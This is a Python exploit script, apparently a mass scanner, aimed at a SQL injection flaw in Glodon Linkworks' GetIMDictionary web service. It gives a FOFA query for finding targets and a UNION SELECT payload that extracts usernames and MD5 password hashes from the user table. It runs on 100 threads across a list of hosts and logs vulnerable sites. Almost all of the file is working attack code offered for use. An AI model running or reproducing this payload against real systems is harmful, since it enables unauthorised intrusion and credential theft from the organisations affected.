# 广联达 Linkworks GetIMDictionarySQL 注入漏洞
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# body="/Services/Identification/"

def banner():
    test ="""
███████╗ ██████╗ ██╗     
██╔════╝██╔═══██╗██║     
███████╗██║   ██║██║     
╚════██║██║▄▄ ██║██║     
███████║╚██████╔╝███████╗
╚══════╝ ╚══▀▀═╝ ╚══════╝         
                                                                                                                                                    
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="广联达 Linkworks GetIMDictionarySQL 注入漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    api_payload = "/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
    headers = {
        'User-Agent':'Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;WOW64;Trident/5.0;SLCC2;.NETCLR2.0.50727;.NETCLR3.5.30729;.NETCLR3.0.30729;MediaCenterPC6.0;.NET4.0C;.NET4.0E;LBBROWSER)',
        'Content-Length':'88',
        'Content-Type':'application/x-www-form-urlencoded',
        'Accept-Encoding':'gzip,deflate,br',
        'Connection':'close',
    }
    data = "key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_1_MD5) from T_ORG_USER --"
    try:
        res1 = requests.post(url=target+api_payload,headers=headers,data=data,verify=False,timeout=10)
        if res1.status_code==200 and 'c4ca4238a0b923820dcc509a6f75849' in res1.text:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")

if __name__ == "__main__":
    main()